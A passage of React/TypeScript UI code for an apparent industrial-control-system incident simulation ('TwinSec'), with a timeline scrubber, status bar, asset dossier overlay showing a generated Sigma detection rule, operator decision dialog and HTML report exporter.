
        <div className="mono-label tabular-nums text-xs">
          <span className="text-foreground/50 text-[10px] block sm:inline mr-1">TIME:</span>
          <strong className="text-accent text-sm">T+{fmt(t)}</strong>{" "}
          <span className="text-foreground/40 text-xs">/ {fmt(total)}</span>
        </div>

        <div className="order-last sm:order-none flex-1 basis-full sm:basis-auto min-w-[200px] relative h-10 flex items-center">
          {/* progress track + filled segment */}
          <div className="absolute inset-x-0 top-1/2 -translate-y-1/2 h-[4px] bg-[#222228] border-b border-rule" />
          <div
            className="absolute top-1/2 -translate-y-1/2 h-[4px] bg-accent transition-[width] duration-75"
            style={{ left: 0, width: `${pct}%` }}
          />
          {/* event markers — sync log + topology when clicked */}
          {events.map((e, i) => (
            <button
              key={i}
              type="button"
              onClick={() => setT(e.t + 0.1)}
              title={`T+${fmt(e.t)} · ${e.tag}: ${e.title}`}
              className="absolute -translate-x-1/2 group z-10 cursor-pointer"
              style={{ left: `${total > 0 ? (e.t / total) * 100 : 0}%` }}
            >
              <span
                className={`block size-2.5 sm:size-3 ${
                  i <= activeIdx ? sevColor(e.sev) : "bg-rule"
                } border border-black group-hover:scale-150 transition-transform`}
              />
              {i === activeIdx && (
                <span className="absolute -top-4 left-1/2 -translate-x-1/2 mono-label text-[9px] text-accent whitespace-nowrap">
                  ▼
                </span>
              )}
            </button>
          ))}
          {/* decision markers above track */}
          {decisions.map((d) => (
            <span
              key={d.id}
              className="absolute -translate-x-1/2 -bottom-1 z-10 pointer-events-none"
              style={{ left: `${total > 0 ? (d.t / total) * 100 : 0}%` }}
              title={d.question}
            >
              <span
                className={`block w-0 h-0 border-x-[4px] border-x-transparent border-t-[6px] ${
                  choices[d.id] ? "border-t-accent" : "border-t-foreground/60"
                }`}
              />
            </span>
          ))}
          <input
            type="range"
            min={0}
            max={total}
            step={1}
            value={Math.round(t)}
            onChange={(e) => setT(Number(e.target.value))}
            className="absolute inset-0 w-full opacity-0 cursor-pointer z-20"
            aria-label="Scrub timeline"
          />
          <div
            className="absolute -translate-x-1/2 pointer-events-none flex flex-col items-center top-0 bottom-0"
            style={{ left: `${pct}%` }}
          >
            <span className="block w-px h-full bg-accent" />
          </div>
        </div>

        <div className="flex items-center gap-1.5 mono-label text-xs">
          <span className="hidden sm:inline text-foreground/50 text-[10px] font-bold">SPEED:</span>
          {[1, 5, 15, 60, 120, 300].map((s) => {
            const active = Math.abs(speed - s) < 2;
            return (
              <button
                key={s}
                type="button"
                onClick={() => setSpeed(s)}
                className={`px-2 py-1 border-2 tabular-nums transition-colors cursor-pointer text-[10px] sm:text-xs ${
                  active
                    ? "bg-accent text-accent-foreground border-black font-black shadow-[2px_2px_0px_#000000]"
                    : "border-rule bg-[#16161b] text-foreground/70 hover:border-accent hover:text-accent"
                }`}
              >
                {s}×
              </button>
            );
          })}
        </div>
      </div>
    </section>
  );
}

/* ------------------------------------------------------------------ */
/*  CHROME                                                            */
/* ------------------------------------------------------------------ */

function StatusBar({
  t,
  playing,
  compromised,
  speed,
  live,
  halt,
  adversary = "UNIT-414",
  mlState = "NOMINAL",
  mlScore = 0.05,
  incidentLabel,
}: {
  t: number;
  playing: boolean;
  compromised: number;
  speed: number;
  live?: { mttd: string; mttr: string; shed: string; cost: string };
  halt?: { node: string; reason: string } | null;
  adversary?: string;
  mlState?: string;
  mlScore?: number;
  incidentLabel?: string;
}) {
  return (
    <div className="border-b border-rule bg-paper text-ink">
      <div className="mx-auto max-w-[1600px] px-5 sm:px-6 lg:px-10 py-3 grid grid-cols-2 sm:grid-cols-3 md:grid-cols-6 mono-label !text-ink/70 gap-2 sm:gap-3 items-center">
        {incidentLabel ? (
          <span className="truncate md:col-span-2 flex items-center gap-1.5">
            <span className="size-2 bg-danger animate-pulse shrink-0" />
            <span className="text-ink font-bold uppercase truncate">{incidentLabel}</span>
          </span>
        ) : (
          <span className="truncate">
            STATE ·{" "}
            <span className="text-ink font-bold">
              {halt ? "HALTED" : playing ? "RUNNING" : "HOLD"}
            </span>
          </span>
        )}
        <span className="truncate">
          CLOCK · <span className="text-ink tabular-nums font-bold">T+{fmt(t)}</span>
        </span>
        <span className="truncate">
          NODES ·{" "}
          <span className="text-ink tabular-nums font-bold">
            {compromised} / {NODES.length}
          </span>
        </span>
        <span className="truncate hidden sm:inline">
          SPEED · <span className="text-ink tabular-nums">{Math.round(speed)}×</span>
        </span>
        <span className="truncate hidden md:inline">
          ML ·{" "}
          <span
            className={
              mlState === "NOMINAL" ? "text-ink font-bold" : "text-danger font-bold animate-pulse"
            }
          >
            {mlState} ({Math.round(mlScore * 100)}%)
          </span>
        </span>
        <span className="truncate hidden md:inline text-right">
          ADVERSARY · <span className="text-ink font-bold">{adversary}</span>
        </span>
      </div>
      {live && (
        <div className="mx-auto max-w-[1600px] px-5 sm:px-6 lg:px-10 pb-3 grid grid-cols-2 md:grid-cols-4 mono-label !text-ink/70 gap-2 sm:gap-3 border-t border-ink/10 pt-3">
          <span className="truncate">
            MTTD · <span className="text-ink tabular-nums font-bold">{live.mttd}</span>
          </span>
          <span className="truncate">
            MTTR · <span className="text-ink tabular-nums font-bold">{live.mttr}</span>
          </span>
          <span className="truncate">
            SHED · <span className="text-ink tabular-nums font-bold">{live.shed}</span>
          </span>
          <span className="truncate">
            IMPACT · <span className="text-ink tabular-nums font-bold">{live.cost}</span>
          </span>
        </div>
      )}
      {halt && (
        <div
          role="alert"
          className="bg-danger text-background px-5 sm:px-6 lg:px-10 py-2 mono-label font-bold text-xs"
        >
          !! PROPAGATION HALTED → {halt.node.toUpperCase()} · {halt.reason} · use `restore{" "}
          {halt.node}` or click node to release
        </div>
      )}
    </div>
  );
}

/* ------------------------------------------------------------------ */
/*  IMPACT TICK (silent flash)                                        */
/* ------------------------------------------------------------------ */

function ImpactTick() {
  return (
    <div
      aria-hidden
      className="pointer-events-none fixed inset-0 z-[60] animate-[impactFlash_420ms_ease-out_forwards] opacity-0"
      style={{
        background:
          "radial-gradient(ellipse at center, color-mix(in oklab, var(--accent) 18%, transparent) 0%, transparent 55%)",
      }}
    >
      <style>{`
        @keyframes impactFlash {
          0% { opacity: 0; }
          15% { opacity: 1; }
          100% { opacity: 0; }
        }
      `}</style>
      <div className="absolute inset-x-0 top-0 h-px bg-accent animate-[impactBar_420ms_ease-out_forwards]" />
      <div className="absolute inset-x-0 bottom-0 h-px bg-accent animate-[impactBar_420ms_ease-out_forwards]" />
      <style>{`
        @keyframes impactBar {
          0% { transform: scaleX(0); transform-origin: left; opacity: 1; }
          100% { transform: scaleX(1); transform-origin: left; opacity: 0; }
        }
      `}</style>
    </div>
  );
}

/* ------------------------------------------------------------------ */
/*  NODE DETAIL OVERLAY                                               */
/* ------------------------------------------------------------------ */

function NodeOverlay({
  node,
  sector = "power",
  onClose,
  compromised,
  isIsolated,
  isBlocked,
  isPatched,
  onToggleIsolate,
  onTogglePatch,
  events,
  t,
  onJump,
}: {
  node: Node;
  sector?: string;
  onClose: () => void;
  compromised: boolean;
  isIsolated?: boolean;
  isBlocked?: boolean;
  isPatched?: boolean;
  onToggleIsolate?: () => void;
  onTogglePatch?: () => void;
  events: (Event & { status?: string; statusDetail?: string })[];
  t: number;
  onJump: (t: number) => void;
}) {
  const [dossierTab, setDossierTab] = useState<"hardware" | "sigma">("hardware");
  const [copiedSigma, setCopiedSigma] = useState(false);

  useEffect(() => {
    const onKey = (e: KeyboardEvent) => e.key === "Escape" && onClose();
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, [onClose]);

  const targetEvent = events[0];
  const sigmaYaml = useMemo(() => {
    return generateSigmaRule({
      sector,
      mitreId: targetEvent?.mitreId || "T0855",
      mitreTactic: targetEvent?.tag || "Inhibit Response Function",
      nodeId: node.id,
      nodeLabel: node.label,
      vendor: node.vendor || "Siemens",
      eventType: targetEvent?.tag || "UNAUTHORIZED_COMMAND",
    });
  }, [sector, targetEvent, node]);

  const handleDownloadSigma = () => {
    const filename = `twinsec_sigma_${sector}_${node.id}.yml`;
    downloadSigmaRuleYml(filename, sigmaYaml);
  };

  const handleCopySigma = () => {
    navigator.clipboard.writeText(sigmaYaml);
    setCopiedSigma(true);
    setTimeout(() => setCopiedSigma(false), 2000);
  };

  return (
    <div
      className="fixed inset-0 z-50 flex items-stretch sm:items-center justify-center bg-background/85 backdrop-blur-md p-0 sm:p-6 animate-fade-in"
      onClick={onClose}
    >
      <div
        className="relative w-full max-w-3xl bg-background border border-rule shadow-2xl flex flex-col max-h-screen sm:max-h-[90vh] overflow-hidden"
        onClick={(e) => e.stopPropagation()}
      >
        {/* Header Bar */}
        <div className="flex items-start justify-between border-b border-rule p-5 sm:p-6 gap-4 bg-muted/20">
          <div className="min-w-0">
            <div className="flex items-center gap-3">
              <span className="mono-label px-2 py-0.5 border border-rule bg-background text-accent">
                PURDUE LEVEL {node.ring} · RING {node.ring}
              </span>
              {isIsolated ? (
                <span className="mono-label px-2 py-0.5 bg-amber-500/20 text-amber-400 border border-amber-500/40">
                  AIR-GAPPED
                </span>
              ) : isPatched ? (
                <span className="mono-label px-2 py-0.5 bg-emerald-500/20 text-emerald-400 border border-emerald-500/40">
                  FIRMWARE ATTESTED
                </span>
              ) : isBlocked ? (
                <span className="mono-label px-2 py-0.5 bg-sky-500/20 text-sky-400 border border-sky-500/40">
                  AIR-GAP PROTECTED
                </span>
              ) : compromised ? (
                <span className="mono-label px-2 py-0.5 bg-danger/20 text-danger border border-danger/40 animate-pulse">
                  COMPROMISED
                </span>
              ) : (
                <span className="mono-label px-2 py-0.5 bg-accent/20 text-accent border border-accent/40">
                  NOMINAL
                </span>
              )}
            </div>
            <p className="display text-4xl sm:text-6xl mt-2 leading-none">{node.label}</p>
            <p className="font-mono text-xs text-foreground/60 mt-2 uppercase tracking-wider">
              {node.kind}
            </p>
          </div>
          <button
            onClick={onClose}
            className="shrink-0 size-10 border border-rule mono-label hover:border-accent hover:text-accent transition-colors flex items-center justify-center text-lg"
            aria-label="Close"
          >
            ✕
          </button>
        </div>

        {/* Dossier Sub-Tabs */}
        <div className="flex border-b border-rule bg-card/60 px-5 sm:px-6 pt-2 gap-2 font-mono text-xs">
          <button
            type="button"
            onClick={() => setDossierTab("hardware")}
            className={`px-3 py-2 border-b-2 font-bold cursor-pointer transition-colors ${
              dossierTab === "hardware"
                ? "border-accent text-accent bg-accent/10"
                : "border-transparent text-foreground/60 hover:text-foreground"
            }`}
          >
            HARDWARE & TIMELINE
          </button>
          <button
            type="button"
            onClick={() => setDossierTab("sigma")}
            className={`px-3 py-2 border-b-2 font-bold cursor-pointer transition-colors flex items-center gap-1.5 ${
              dossierTab === "sigma"
                ? "border-accent text-accent bg-accent/10"
                : "border-transparent text-foreground/60 hover:text-foreground"
            }`}
          >
            <span className="size-2 bg-accent inline-block" />
            SIGMA SIEM RULE
          </button>
        </div>

        {/* Content Body (Scrollable) */}
        <div className="overflow-y-auto flex-1">
          {dossierTab === "sigma" ? (
            <div className="p-5 sm:p-6 space-y-4 font-mono text-xs">
              <div className="flex flex-wrap items-center justify-between gap-3 border-b border-rule pb-3">
                <div>
                  <span className="mono-label text-[10px] text-accent font-bold tracking-widest block">
                    // PRODUCTION SIEM DETECTION RULE (SIGMA STANDARD)
                  </span>
                  <span className="text-[11px] text-foreground/80">
                    TARGET: <strong className="text-foreground">{node.label}</strong> ·{" "}
                    {node.vendor} · PURDUE L{node.ring}
                  </span>
                </div>
                <div className="flex gap-2">
                  <button
                    type="button"
                    onClick={handleCopySigma}
                    className="px-3 py-1.5 border border-rule bg-card font-mono text-xs font-bold hover:border-accent hover:text-accent transition-colors cursor-pointer"
                  >
                    {copiedSigma ? "COPIED ✅" : "COPY YAML"}
                  </button>
                  <button
                    type="button"
                    onClick={handleDownloadSigma}
                    className="px-3 py-1.5 bg-accent text-accent-foreground font-mono text-xs font-bold hover:bg-foreground hover:text-background transition-colors cursor-pointer shadow-brutal"
                  >
                    DOWNLOAD .YML ↓
                  </button>
                </div>
              </div>

              <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 text-[11px]">
                <div className="p-2 border border-rule bg-card/40">
                  <span className="text-foreground/40 block text-[9px]">MITRE TTP</span>
                  <span className="text-accent font-bold">{targetEvent?.mitreId || "T0855"}</span>
                </div>
                <div className="p-2 border border-rule bg-card/40">
                  <span className="text-foreground/40 block text-[9px]">LOG SOURCE</span>
                  <span className="text-foreground font-bold">Zeek / Suricata</span>
                </div>
                <div className="p-2 border border-rule bg-card/40">
                  <span className="text-foreground/40 block text-[9px]">PROTOCOL</span>
                  <span className="text-foreground font-bold uppercase">
                    {sector === "power" ? "DNP3 / IEC-104" : "MODBUS-TCP"}
                  </span>
                </div>
                <div className="p-2 border border-rule bg-card/40">
                  <span className="text-foreground/40 block text-[9px]">SEVERITY</span>
                  <span className="text-danger font-bold">HIGH (CRITICAL)</span>
                </div>
              </div>

              <div className="relative">
                <pre className="p-4 bg-black border border-rule text-xs text-foreground/90 overflow-x-auto leading-relaxed font-mono">
                  {sigmaYaml}
                </pre>
              </div>

              <div className="p-3 border border-rule/60 bg-muted/10 text-[11px] text-foreground/70 leading-relaxed">
                <span className="text-accent font-bold">// DEPLOYMENT ADVISORY: </span>
                Export and ingest this rule into your SOC SIEM (Splunk, Elastic, or Microsoft
                Sentinel) to trigger automated alerts on unauthorized control messages targeting{" "}
                {node.label}.
              </div>
            </div>
          ) : (
            <>
              <div className="grid grid-cols-1 sm:grid-cols-2 border-b border-rule">
                <div className="p-5 sm:p-6 border-b sm:border-b-0 sm:border-r border-rule">
                  <p className="mono-label">TELEMETRY & HARDWARE PROFILE</p>
                  <p
                    className={`display text-2xl sm:text-3xl mt-2 ${
                      isIsolated
                        ? "text-amber-400"
                        : isPatched
                          ? "text-emerald-400"
                          : isBlocked
                            ? "text-sky-400"
                            : compromised
                              ? "text-danger"
                              : "text-accent"
                    }`}
                  >
                    {isIsolated
                      ? "AIR-GAPPED FROM OT BUS"
                      : isPatched
                        ? "ATTESTED & SECURED"
                        : isBlocked
                          ? "CASCADE BLOCKED"
                          : compromised
                            ? "COMPROMISED VECTOR"
                            : "NOMINAL OPERATION"}
                  </p>
                  <div className="mt-5 space-y-3 font-mono text-xs text-foreground/70">
                    <Row k="vendor" v={node.vendor} />
                    <Row k="firmware" v={node.firmware} />
                    <Row k="exposure" v={node.exposure} />
                    <Row
                      k="ip_addr"
                      v={`10.240.${node.ring}.${node.id.replace(/\D/g, "") || "10"}`}
                    />
                    <Row k="t_clock" v={`T+${fmt(t)}`} />
                  </div>
                </div>
                <div className="p-5 sm:p-6">
                  <p className="mono-label">DOWNSTREAM & AFFECTED ASSETS</p>
                  <ul className="mt-3 space-y-2 font-serif text-base sm:text-lg">
                    {node.affects.map((a) => (
                      <li key={a} className="flex items-baseline gap-3">
                        <span className="size-1.5 bg-accent shrink-0 translate-y-0.5" />
                        <span>{a}</span>
                      </li>
                    ))}
                  </ul>
                  <div className="mt-6 pt-4 border-t border-rule/50">
                    <p className="mono-label text-foreground/50 text-[10px]">
                      ATTESTATION SIGNATURE
                    </p>
                    <p className="font-mono text-[11px] text-accent/80 mt-1 truncate">
                      SHA256:8f4e2b09a{node.id}93cf82e01b
                    </p>
                  </div>
                </div>
              </div>

              <div className="p-5 sm:p-6">
                <div className="flex items-center justify-between">
                  <p className="mono-label">TIMELINE FRAMES · TOUCHING THIS ASSET</p>
                  <span className="mono-label text-xs text-foreground/60">
                    {events.length} EVENTS
                  </span>
                </div>
                {events.length === 0 ? (
                  <p className="mt-4 font-serif italic text-foreground/60">
                    No incident frames currently touch this asset directly.
                  </p>
                ) : (
                  <ol className="mt-4 space-y-3">
                    {events.map((e, i) => {
                      const evTime =
                        typeof e.t === "number" && !isNaN(e.t)
                          ? e.t
                          : typeof (e as unknown as { time?: number }).time === "number" &&
                              !isNaN((e as unknown as { time?: number }).time!)
                            ? (e as unknown as { time?: number }).time!
                            : 0;
                      const isBlockedEvent =
                        e.status === "BLOCKED_AIRGAP" ||
                        e.status === "PREVENTED_UPSTREAM" ||
                        e.status === "PATCHED";

                      return (
                        <li key={i}>
                          <button
                            onClick={() => onJump(evTime)}
                            className="w-full text-left grid grid-cols-[4.5rem_auto_minmax(0,1fr)_auto] gap-3 items-center border border-rule p-3 hover:border-accent hover:bg-accent/5 transition-colors group"
                          >
                            <span className="font-mono text-xs text-foreground/60 group-hover:text-accent">
                              T+{fmt(evTime)}
                            </span>
                            <span
                              className={`size-2.5 ${
                                e.status === "BLOCKED_AIRGAP"
                                  ? "bg-amber-400"
                                  : e.status === "PREVENTED_UPSTREAM"
                                    ? "bg-sky-400"
                                    : e.status === "PATCHED"
                                      ? "bg-emerald-400"
                                      : sevColor(e.sev)
                              }`}
                            />
                            <div className="min-w-0">
                              <p
                                className={`font-serif text-sm sm:text-base font-medium truncate ${
                                  isBlockedEvent ? "line-through opacity-70" : ""
                                }`}
                              >
                                {e.title}
                              </p>
                              {e.statusDetail && (
                                <p className="font-mono text-[11px] text-amber-400/90 truncate">
                                  {e.statusDetail}
                                </p>
                              )}
                            </div>
                            <span className="mono-label text-xs text-accent opacity-0 group-hover:opacity-100 transition-opacity">
                              JUMP →
                            </span>
                          </button>
                        </li>
                      );
                    })}
                  </ol>
                )}
              </div>
            </>
          )}
        </div>

        {/* Footer Actions */}
        <div className="p-4 sm:p-6 border-t border-rule bg-muted/10 flex flex-wrap gap-3 justify-end items-center">
          <button
            onClick={onClose}
            className="mono-label border border-rule px-4 py-2.5 hover:border-accent hover:text-accent transition-colors text-xs sm:text-sm"
          >
            CLOSE DOSSIER [ESC]
          </button>
          {onTogglePatch && (
            <button
              onClick={onTogglePatch}
              className={`mono-label px-4 py-2.5 transition-colors text-xs sm:text-sm ${
                isPatched
                  ? "bg-emerald-500/30 text-emerald-300 border border-emerald-500/50 hover:bg-emerald-500/40 font-bold"
                  : "bg-muted/80 text-foreground border border-rule hover:border-emerald-400 hover:text-emerald-400 font-bold"
              }`}
            >
              {isPatched ? "REVERT PATCH ↩" : "DEPLOY FIRMWARE PATCH [PATCH]"}
            </button>
          )}
          {onToggleIsolate && (
            <button
              onClick={onToggleIsolate}
              className={`mono-label px-4 py-2.5 transition-colors text-xs sm:text-sm ${
                isIsolated
                  ? "bg-amber-500 text-black hover:bg-amber-400 font-bold"
                  : "bg-accent text-accent-foreground hover:bg-foreground hover:text-background font-bold"
              }`}
            >
              {isIsolated ? "RECONNECT TO OT BUS ←" : "ISOLATE ASSET (AIR-GAP) →"}
            </button>
          )}
        </div>
      </div>
    </div>
  );
}

/* ------------------------------------------------------------------ */
/*  DECISION OVERLAY                                                  */
/* ------------------------------------------------------------------ */

function DecisionOverlay({
  decision,
  onChoose,
}: {
  decision: Decision;
  onChoose: (id: ChoiceId) => void;
}) {
  // Only present 2 options: ACT vs DEFEND
  const activeOptions = decision.options.slice(0, 2);

  return (
    <div className="fixed inset-0 z-50 flex items-stretch sm:items-center justify-center bg-ink/80 backdrop-blur-sm p-0 sm:p-6 animate-fade-in">
      <div className="relative w-full max-w-3xl bg-paper text-ink border border-ink shadow-2xl flex flex-col max-h-screen sm:max-h-[90vh] overflow-auto">
        <div className="border-b border-ink/20 p-5 sm:p-8">
          <div className="flex flex-wrap items-baseline justify-between gap-3">
            <p className="mono-label !text-ink/60">
              OPERATOR DECISION REQUIRED · T+{fmt(decision.t)}
            </p>
            <span className="mono-label px-2 py-0.5 bg-accent text-accent-foreground text-[10px]">
              ACT vs DEFEND
            </span>
          </div>
          <p className="font-serif text-2xl sm:text-4xl italic mt-3 leading-[1.05]">
            {decision.question}
          </p>
          <p className="font-mono text-xs sm:text-sm text-ink/70 mt-4 leading-relaxed">
            {decision.trigger.toUpperCase()} · {decision.context}
          </p>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2">
          {activeOptions.map((o) => (
            <button
              key={o.id}
              onClick={() => onChoose(o.id)}
              className="text-left p-6 border-t sm:border-t-0 sm:border-l first:sm:border-l-0 border-ink/20 hover:bg-ink hover:text-paper transition-colors group cursor-pointer"
            >
              <p className="mono-label font-bold text-accent">
                {o.id === "ACT" ? "[ACT] OPERATIONAL OVERRIDE" : "[DEFEND] AIR-GAP & ATTESTATION"}
              </p>
              <p className="display text-2xl sm:text-3xl mt-2 leading-none">{o.label}</p>
              <p className="font-serif text-sm sm:text-base italic mt-4 leading-snug opacity-80 group-hover:opacity-100">
                → {o.consequence}
              </p>
            </button>
          ))}
        </div>
      </div>
    </div>
  );
}

/* ------------------------------------------------------------------ */
/*  SMALL PARTS                                                       */
/* ------------------------------------------------------------------ */

function Stat({ k, v, big }: { k: string; v: string; big?: boolean }) {
  return (
    <div className="min-w-0">
      <dt className="mono-label truncate">{k}</dt>
      <dd className={`mt-2 ${big ? "display text-4xl sm:text-5xl" : "font-mono text-sm"}`}>{v}</dd>
    </div>
  );
}

function Row({ k, v }: { k: string; v: string }) {
  return (
    <div className="grid grid-cols-[auto_minmax(0,1fr)] gap-3 items-baseline">
      <span className="text-foreground/40">{k}</span>
      <span className="text-right truncate">{v}</span>
    </div>
  );
}

function Gauge({
  label,
  unit,
  value,
  min,
  max,
  crit,
  invert,
}: {
  label: string;
  unit: string;
  value: number;
  min: number;
  max: number;
  crit: number;
  invert?: boolean;
}) {
  const pct = Math.max(0, Math.min(1, (value - min) / (max - min)));
  const danger = invert ? value < crit : value > crit;
  return (
    <div>
      <div className="flex justify-between mono-label">
        <span>{label}</span>
        <span className={`tabular-nums ${danger ? "text-danger" : "text-foreground"}`}>
          {value.toFixed(1)} <span className="text-foreground/40">{unit}</span>
        </span>
      </div>
      <div className="mt-2 h-1.5 bg-muted relative">
        <div
          className={`h-full ${danger ? "bg-danger" : "bg-accent"} transition-all`}
          style={{ width: `${pct * 100}%` }}
        />
        <div
          className="absolute top-0 bottom-0 w-px bg-foreground/60"
          style={{ left: `${((crit - min) / (max - min)) * 100}%` }}
        />
      </div>
    </div>
  );
}

function Sparkline({ t }: { t: number }) {
  const pts = useMemo(() => {
    const arr: number[] = [];
    for (let i = 0; i < 60; i++) {
      const x = i / 60;
      const drift = (t / TOTAL) * x;
      arr.push(50 + Math.sin(t / 5 + i / 4) * 6 + drift * 30);
    }
    return arr;
  }, [t]);
  const d = pts
    .map(
      (y, i) => `${i === 0 ? "M" : "L"} ${(i / (pts.length - 1)) * 100} ${100 - (y / 100) * 100}`,
    )
    .join(" ");
  return (
    <div className="mt-3 border border-rule p-3">
      <svg viewBox="0 0 100 100" preserveAspectRatio="none" className="w-full h-20">
        <path
          d={d}
          fill="none"
          stroke="oklch(0.86 0.24 125)"
          strokeWidth="1.2"
          vectorEffect="non-scaling-stroke"
        />
        <path d={`${d} L 100 100 L 0 100 Z`} fill="oklch(0.86 0.24 125)" opacity="0.08" />
      </svg>
      <div className="flex justify-between mono-label mt-2">
        <span>−60s</span>
        <span className="text-accent">NOW</span>
      </div>
    </div>
  );
}

/* ------------------------------------------------------------------ */
/*  DOSSIER EXPORT (PDF/HTML)                                         */
/* ------------------------------------------------------------------ */

function escapeHtml(s: string): string {
  return s.replace(
    /[&<>"']/g,
    (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[c] as string,
  );
}

function buildDossierHTML(args: {
  t: number;
  speed: number;
  choices: Record<string, ChoiceId>;
  outcome: ReturnType<typeof computeOutcome>;
  interactions: { t: number; nodeId: string }[];
  selected: string | null;
  compromisedCount: number;
  shareUrl: string;
}): string {
  const { t, speed, choices, outcome, interactions, selected, compromisedCount, shareUrl } = args;
  const stamp = new Date().toISOString();

  const decisionRows = DECISIONS.map((d) => {
    const c = choices[d.id];
    const opt = c ? d.options.find((o) => o.id === c) : null;
    return `<tr>
      <td>T+${fmt(d.t)}</td>
      <td>${escapeHtml(d.trigger)}</td>
      <td><strong>${c ?? "—"}</strong> ${opt ? "· " + escapeHtml(opt.label) : ""}</td>
      <td>${opt ? escapeHtml(opt.consequence) : "<em>no decision recorded</em>"}</td>
    </tr>`;
  }).join("");

  const interactionRows = interactions.length
    ? interactions
        .map((i) => {
          const n = NODES.find((x) => x.id === i.nodeId);
          return `<tr><td>T+${fmt(i.t)}</td><td>${escapeHtml(n?.label ?? i.nodeId)}</td><td>${escapeHtml(n?.kind ?? "")}</td></tr>`;
        })
        .join("")
    : `<tr><td colspan="3"><em>No node interactions recorded.</em></td></tr>`;

  return `<!doctype html><html><head><meta charset="utf-8"/>
<title>TwinSec · Operator Dossier · HW-${outcome.dossierId}</title>
<style>
  @page { size: A4; margin: 18mm; }
  :root { color-scheme: light; }
  html,body { background:#f6f5ef; color:#0f0f12; font-family: ui-monospace, "JetBrains Mono", Menlo, monospace; }
  body { margin: 32px auto; max-width: 880px; padding: 0 24px; line-height: 1.5; }
  h1 { font-family: "Bebas Neue", Impact, sans-serif; font-size: 64px; letter-spacing: 0.01em; margin: 0 0 4px; line-height: 0.9; }
  h2 { font-family: "Bebas Neue", Impact, sans-serif; font-size: 28px; margin: 36px 0 12px; border-bottom: 2px solid #0f0f12; padding-bottom: 6px; }
  .label { font-size: 10px; letter-spacing: 0.18em; text-transform: uppercase; color: #555; }
  .lede { font-family: "Instrument Serif", Georgia, serif; font-style: italic; font-size: 20px; max-width: 60ch; margin: 12px 0 0; }
  .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 18px; margin: 18px 0 0; }
  .grid .k { font-size: 10px; letter-spacing: 0.18em; text-transform: uppercase; color: #555; }
  .grid .v { font-family: "Bebas Neue", Impact, sans-serif; font-size: 32px; }
  table { width: 100%; border-collapse: collapse; font-size: 12px; }
  th, td { text-align: left; padding: 8px 10px; border-bottom: 1px solid #d3d1c5; vertical-align: top; }
  th { font-size: 10px; letter-spacing: 0.18em; text-transform: uppercase; color: #555; }
  .branch { display: inline-block; background:#0f0f12; color:#d9ff3f; padding:3px 8px; font-size:10px; letter-spacing:0.18em; }
  .share { word-break: break-all; font-size: 10px; color: #555; border: 1px dashed #888; padding: 8px; margin-top: 8px; }
  .narrative { font-family: "Instrument Serif", Georgia, serif; font-style: italic; font-size: 22px; max-width: 60ch; }
  hr { border: none; border-top: 2px solid #0f0f12; margin: 24px 0; }
  @media print { body { margin: 0; } .no-print { display: none; } }
</style></head><body>
  <div class="label">TwinSec · OPERATOR DOSSIER · ${escapeHtml(stamp)}</div>
  <h1>HOLLOW.</h1>
  <p class="lede">Substation-07 · Sector 9 · Exercise replay capture.</p>

  <div class="grid">
    <div><div class="k">Branch</div><div class="v">${escapeHtml(outcome.branch)}</div></div>
    <div><div class="k">MW Shed</div><div class="v">${outcome.mw}</div></div>
    <div><div class="k">MTTD</div><div class="v">${escapeHtml(outcome.mttd)}</div></div>
    <div><div class="k">MTTR</div><div class="v">${escapeHtml(outcome.mttr)}</div></div>
    <div><div class="k">Cost</div><div class="v">${escapeHtml(outcome.cost)}</div></div>
    <div><div class="k">Duration</div><div class="v">${escapeHtml(outcome.duration)}</div></div>
    <div><div class="k">Alarms</div><div class="v">${escapeHtml(outcome.alarms)}</div></div>
    <div><div class="k">Dossier</div><div class="v">HW-${escapeHtml(outcome.dossierId)}</div></div>
  </div>

  <h2>Transport Pace</h2>
  <table>
    <tr><th>Sim clock</th><td>T+${fmt(t)} / ${fmt(TOTAL)}</td></tr>
    <tr><th>Pace preset</th><td>${speed}×</td></tr>
    <tr><th>Compromised nodes</th><td>${compromisedCount} / ${NODES.length}</td></tr>
    <tr><th>Last opened asset</th><td>${escapeHtml(selected ?? "—")}</td></tr>
  </table>

  <h2>Operator Decisions</h2>
  <table>
    <thead><tr><th>When</th><th>Trigger</th><th>Choice</th><th>Consequence</th></tr></thead>
    <tbody>${decisionRows}</tbody>
  </table>

  <h2>Node Interactions</h2>
  <table>
    <thead><tr><th>When</th><th>Asset</th><th>Kind</th></tr></thead>
    <tbody>${interactionRows}</tbody>
  </table>

  <h2>Outcome Spread</h2>
  <p class="narrative">“${escapeHtml(outcome.narrative)}”</p>

  <h2>Shareable Replay Link</h2>
  <div class="share">${escapeHtml(shareUrl)}</div>

  <hr/>
  <div class="label">END OF DOSSIER · <span class="branch">BRANCH ${escapeHtml(outcome.branch)}</span></div>
  <script>setTimeout(function(){ /* allow user to trigger print from UI */ }, 50);</script>
</body></html>`;
}
